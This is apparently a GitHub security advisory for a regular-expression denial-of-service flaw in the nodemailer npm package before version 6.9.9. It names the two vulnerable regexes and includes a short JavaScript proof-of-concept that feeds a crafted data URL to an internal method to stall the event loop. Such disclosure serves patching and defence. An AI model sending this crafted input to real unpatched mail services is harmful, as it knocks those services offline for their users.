# [M] nodemailer ReDoS when trying to send a specially crafted email

## Summary
Severity: Medium
Advisory: GHSA-9h6g-pr28-7cqp
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2024-01-31
Source: https://github.com/advisories/GHSA-9h6g-pr28-7cqp
Type: github-advisory

## Affected
- npm: `nodemailer` — affected >=0 <6.9.9

## Details
### Summary
A ReDoS vulnerability occurs when nodemailer tries to parse img files with the parameter `attachDataUrls` set, causing the stuck of event loop. 
Another flaw was found when nodemailer tries to parse an attachments with a embedded file, causing the stuck of event loop. 

### Details

Regex: /^data:((?:[^;]*;)*(?:[^,]*)),(.*)$/

Path: compile -> getAttachments -> _processDataUrl

Regex: /(<img\b[^>]* src\s*=[\s"']*)(data:([^;]+);[^"'>\s]+)/

Path: _convertDataImages

### PoC

https://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6
https://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698

```js
async function exploit() {
   const MailComposer = require(\"nodemailer/lib/mail-composer\");
   const MailComposerObject = new MailComposer();

   // Create a malicious data URL that will cause excessive backtracking
   // This data URL is crafted to have a long sequence of characters that will cause the regex to backtrack
   const maliciousDataUrl = 'data:image/png;base64,' + 'A;B;C;D;E;F;G;H;I;J;K;L;M;N;O;P;Q;R;S;T;U;V;W;X;Y;Z;'.repeat(1000) + '==';

   // Call the vulnerable method with the crafted input
   const result = await MailComposerObject._processDataUrl({ path: maliciousDataUrl });
}

await exploit();
```

### Impact

ReDoS causes the event loop to stuck a specially crafted evil email can cause this problem.

## References
- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-9h6g-pr28-7cqp
- https://github.com/nodemailer/nodemailer/commit/dd8f5e8a4ddc99992e31df76bcff9c590035cd4a
- https://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6
- https://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698
- https://github.com/nodemailer/nodemailer
